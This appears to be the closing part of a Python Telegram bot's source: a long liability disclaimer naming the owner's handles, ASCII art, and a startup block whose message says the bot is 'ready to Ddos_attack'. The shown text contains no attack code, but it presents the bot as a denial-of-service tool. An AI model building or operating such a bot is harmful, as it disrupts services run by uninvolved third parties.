This bot is owned and operated by @kksharma_yt on Telegram and kksharma_yt on Instagram, 🇮🇳. By using this bot, you acknowledge that you understand and agree to the following terms:

* **🔒 NO WARRANTIES**: This bot is provided "as is" and "as available", without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement.
* **🚫 LIMITATION OF LIABILITY**: The owner and operator of this bot, @kksharma_yt on Telegram and kksharma_yt on Instagram, shall not be liable for any damages or losses arising from the use of this bot, including but not limited to direct, indirect, incidental, punitive, and consequential damages, including loss of profits, data, or business interruption.
* **📚 COMPLIANCE WITH LAWS**: You are responsible for ensuring that your use of this bot complies with all applicable laws and regulations, including but not limited to laws related to intellectual property, data privacy, and cybersecurity.
* **📊 DATA COLLECTION**: This bot may collect and use data and information about your usage, including but not limited to your IP address, device information, and usage patterns, and you consent to such collection and use.
* **🤝 INDEMNIFICATION**: You agree to indemnify and hold harmless @kksharma_yt on Telegram and kksharma_yt on Instagram, and its affiliates, officers, agents, and employees, from and against any and all claims, damages, obligations, losses, liabilities, costs or debt, and expenses (including but not limited to attorney's fees) arising from or related to your use of this bot.
* **🌐 THIRD-PARTY LINKS**: This bot may contain links to third-party websites or services, and you acknowledge that @kksharma_yt on Telegram and kksharma_yt on Instagram is not responsible for the content, accuracy, or opinions expressed on such websites or services.
* **🔄 MODIFICATION AND DISCONTINUATION**: You agree that @kksharma_yt on Telegram and kksharma_yt on Instagram may modify or discontinue this bot at any time, without notice, and that you will not be entitled to any compensation or reimbursement for any losses or damages arising from such modification or discontinuation.
* **👧 AGE RESTRICTION**: You acknowledge that this bot is not intended for use by minors, and that you are at least 18 years old (or the age of majority in your jurisdiction) to use this bot.
* **🇮🇳 GOVERNING LAW**: You agree that this disclaimer and the terms and conditions of this bot will be governed by and construed in accordance with the laws of India, 🇮🇳, and that any disputes arising from or related to this bot will be resolved through binding arbitration in accordance with the rules of [Arbitration Association].
* **📝 ENTIRE AGREEMENT**: This disclaimer constitutes the entire agreement between you and @kksharma_yt on Telegram and kksharma_yt on Instagram regarding your use of this bot, and supersedes all prior or contemporaneous agreements or understandings.
* **👍 ACKNOWLEDGMENT**: By using this bot, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions. If you do not agree to these terms and conditions, please do not use this bot.

**👋 THANK YOU FOR READING! 👋**
"""
# don't Change the " DISCLAIMER " ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
"""
███████▀▀▀░░░░░░░▀▀▀███████  
████▀░░░░░░░░░░░░░░░░░▀████  
███│░░░░░░░░░░░░░░░░░░░│███  
██▌│░░░░░░░░░░░░░░░░░░░│▐██  
██░└┐░░░░░░░░░░░░░░░░░┌┘░██  
██░░└┐░░░░░░░░░░░░░░░┌┘░░██  
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██  
██▌░│██████▌░░░▐██████│░▐██  
███░│▐███▀▀░░▄░░▀▀███▌│░███  
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██  
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██  
████▄─┘██▌░░░░░░░▐██└─▄████  
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████  
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████  
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  
███████▄░░░░░░░░░░░▄███████  
██████████▄▄▄▄▄▄▄██████████  
███████████████████████████  
"""
# 🎮 Run the bot ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
if __name__ == "__main__":
    print(" 🎉🔥 Starting the Telegram bot...")  # Print statement for bot starting
    print(" ⏱️ Initializing bot components...")  # Print statement for initialization

    # Add a delay to allow the bot to initialize ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──✦•┈๑⋅⋯ ⋯⋅๑┈•✦
    time.sleep(5)

    # Print a success message if the bot starts successfully ╰┈➤. ────⋆⋅☆⋅⋆──────⋆⋅☆⋅⋆──
    print(" 🚀 Telegram bot started successfully!")  # ╰┈➤. Print statement for successful startup
    print(" 👍 Bot is now online and ready to Ddos_attack! ▰▱▰▱▰▱▰▱▰▱▰▱▰▱")

    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot encountered an error: {e}")
        print(" 🚨 Error: Bot encountered an error. Restarting in 5 seconds... ⏰")
        time.sleep(5)  # Wait before restarting ✦•┈๑⋅⋯ ⋯⋅๑┈•✦
        print(" 🔁 Restarting the Telegram bot... 🔄")
        print(" 💻 Bot is now restarting. Please wait... ⏳")
        
